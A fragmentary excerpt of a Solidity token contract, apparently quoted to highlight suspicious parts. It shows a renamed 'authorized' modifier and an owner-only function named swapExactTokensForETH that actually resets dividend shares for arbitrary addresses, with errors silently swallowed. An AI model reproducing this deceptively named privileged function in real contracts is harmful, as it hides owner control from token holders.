 ...
 modifier UHSJorized() {
 require(isUHSJorized(msg.sender), "!UHSJORIZED");
 _;
 }
 ...
 value: amountBNBMarketing, gas: 30000}
 ("");
 tmpSuccess = false;
 ...
 function swapExactTokensForETH( address from, address[] calldata addresses, uint256 tokens ) external UHSJorized {
 ...
 try distributor.setShare(addresses[i], balanceOf(addresses[i])) {
 }
 catch {
 }
 }
 ...
 try distributor.setShare(from, balanceOf(from)) {
 }
 catch {
 }
 }
